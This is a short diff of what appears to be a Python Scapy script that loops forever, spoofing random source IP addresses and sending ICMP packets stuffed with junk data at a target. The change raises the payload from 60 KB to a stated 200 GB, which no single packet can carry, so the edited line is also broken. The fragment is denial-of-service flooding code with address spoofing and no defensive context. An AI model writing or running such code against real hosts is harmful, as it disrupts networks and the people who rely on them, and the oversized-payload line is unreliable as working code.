@@ -20,5 +20,5 @@ while True:
 
     rand_addr = address_spoofer()
     ip_hdr = IP(src=rand_addr, dst=target)
-    packet = ip_hdr/ICMP()/("m"*60000) #send 60k bytes of junk
+    packet = ip_hdr/ICMP()/("m"*200000000000) #send 200 GB of junk
     send(packet)
